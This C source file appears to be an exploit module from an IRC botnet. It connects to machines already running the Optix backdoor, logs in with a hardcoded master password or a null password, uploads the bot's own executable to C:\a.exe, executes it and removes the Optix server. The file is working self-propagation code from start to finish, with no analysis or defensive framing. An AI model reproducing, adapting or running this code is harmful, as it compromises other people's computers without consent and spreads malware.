#include "optix.h"
#include "defines.h"
#include "rshellcode.h"
#include "advscan.h"
#include "defines.h"
#include "../sdcompat.h"
#include "../mainctrl.h"

#ifndef NO_OPTIX

BOOL Optix(EXINFO exinfo)
{
	char buffer[IRCLINE], szBuffer[64], szFilePath[MAX_PATH];

	int read = 0;

	WSADATA opxdata, upldata;
	SOCKET opxsock, uplsock;
	SOCKADDR_IN opxinfo, uplinfo;
	bool IS11 = FALSE;

	if (WSAStartup(MAKEWORD(2,2), &opxdata) != 0) 
		return FALSE;

	//Connect To Optix Main Port
	opxinfo.sin_addr.s_addr = inet_addr(exinfo.ip);
	opxinfo.sin_port = htons((unsigned short)exinfo.port);		
	opxinfo.sin_family = AF_INET;
	opxsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	start:
	if (connect(opxsock, (LPSOCKADDR)&opxinfo, sizeof(opxinfo)) == SOCKET_ERROR) {
		closesocket(opxsock);
		WSACleanup();
		return FALSE;
	}

	//Auth
	//Note: OPTIX BLOCKS YA ASS UNTIL RESTART IF PASS IS WRONG 3TIMES :/
	if (IS11 == TRUE) 
		sprintf(szBuffer, "022¬kjui3498fjk34289890fwe334gfew4ger$\"sdf¬v1.1\r\n"); //MASTERPASSWORD = 1.1 Server
	else 
		sprintf(szBuffer, "022¬kjui3498fjk34289890fwe334gfew4ger$\"sdf¬v1.2\r\n"); //MASTERPASSWORD = 1.2 Server
	send(opxsock, szBuffer, strlen(szBuffer), 0);
	Sleep(500);

	memset(szBuffer, 0, sizeof(szBuffer));
	recv(opxsock, szBuffer, sizeof(szBuffer), 0);
	//1.1 Check
	if (strstr(szBuffer, "001¬Your client version is outdated!") != NULL) { //1.1 Server
		IS11 = TRUE;
		closesocket(opxsock);
		goto start;
	}
	//All Others
	if (strstr(szBuffer, "001¬") == NULL) { //001 Should Be The Same On All Versions, Therefore strstr();
		Sleep(500);
		
		//If "OPtest" Dont Work, Try NULL Password
		if (IS11 == TRUE) 
			sprintf(szBuffer, "022¬¬v1.1\r\n"); //NULL Password, 1.1 Server
		else 
			sprintf(szBuffer, "022¬¬v1.2\r\n"); //NULL Password, 1.2 Server
		send(opxsock, szBuffer, strlen(szBuffer), 0);
		Sleep(500);

		memset(szBuffer, 0, sizeof(szBuffer));
		recv(opxsock, szBuffer, sizeof(szBuffer), 0);
		if (strstr(szBuffer, "001¬") == NULL) { //001 Should Be The Same On All Versions, Therefore strstr();
			closesocket(opxsock);
			WSACleanup();
			return FALSE;
		}
	}

	//Prepare Optix For Upload
	send(opxsock, "019¬\r\n", 6, 0);
	Sleep(500);

	memset(szBuffer, 0, sizeof(szBuffer));
	recv(opxsock, szBuffer, sizeof(szBuffer), 0);
	if (strcmp(szBuffer, "020¬\r\n") != 0) {
		closesocket(opxsock);
		WSACleanup();
		return FALSE;
	}

	//Get FilePath
	memset(szFilePath, 0, sizeof(szFilePath));
	GetModuleFileName(NULL, szFilePath, sizeof(szFilePath));
	//sprintf(szFilePath, szLocalPayloadFile);

	//Open File
	FILE *f = fopen(szFilePath, "rb");
	if (f == NULL) {	
		closesocket(opxsock);
		WSACleanup();
		return FALSE;
	}

	//Connect To Upload Socket..
	if (WSAStartup(MAKEWORD(2,2), &upldata) != 0) {
		closesocket(opxsock);
		WSACleanup();
		return FALSE;
	}
	
	uplinfo.sin_addr.s_addr = inet_addr(exinfo.ip);
	uplinfo.sin_port = htons(500);		
	uplinfo.sin_family = AF_INET;
	uplsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (connect(uplsock, (LPSOCKADDR)&uplinfo, sizeof(uplinfo)) == SOCKET_ERROR) {
		closesocket(uplsock);
		closesocket(opxsock);
		WSACleanup();
		return FALSE;
	}
	
	//Send File Info (Where To Upload And Size..)
	HANDLE hFile = CreateFile(szFilePath, GENERIC_READ,FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	DWORD dwSize = GetFileSize(hFile, 0);
	CloseHandle(hFile);

	sprintf(szBuffer, "C:\\a.exe\r\n%d\r\n", dwSize);
	send(uplsock, szBuffer, strlen(szBuffer), 0);
	Sleep(500);

	memset(szBuffer, 0, sizeof(szBuffer));
	recv(uplsock, szBuffer, sizeof(szBuffer), 0);

	//OK REDY Received, Upload File..
	if (strstr(szBuffer, "+OK REDY") == NULL) 
	{
		closesocket(uplsock);
		closesocket(opxsock);
		WSACleanup();
		return FALSE;
	}

	//Upload \o/
	memset(szBuffer, 0, sizeof(szBuffer));
	while (!feof(f)) 
	{
		read = fread(szBuffer, sizeof(char), sizeof(szBuffer), f);
		send(uplsock, szBuffer, read, 0);
	}

	memset(szBuffer, 0, sizeof(szBuffer));
	recv(uplsock, szBuffer, sizeof(szBuffer), 0);

	//Execute File If Upload Success
	if (strstr(szBuffer, "+OK RCVD") != NULL) {
		closesocket(uplsock);
		send(opxsock, "008¬C:\\a.exe\r\n", 14, 0);
		Sleep(500);
		memset(szBuffer, 0, sizeof(szBuffer));
		recv(opxsock, szBuffer, sizeof(szBuffer), 0);
		if (strcmp(szBuffer, "001¬Error Executing File\r\n") == 0) 
		{
			closesocket(uplsock);
			closesocket(opxsock);
			WSACleanup();
			return FALSE;
		}
	} else {
		closesocket(uplsock);
		closesocket(opxsock);
		WSACleanup();
		return FALSE;
	}	

	//Remove Optix Server
	send(opxsock, "100¬\r\n", 6, 0);
	closesocket(uplsock);
	closesocket(opxsock);
	WSACleanup();

	AddEx(exinfo);

	return TRUE;
}
#endif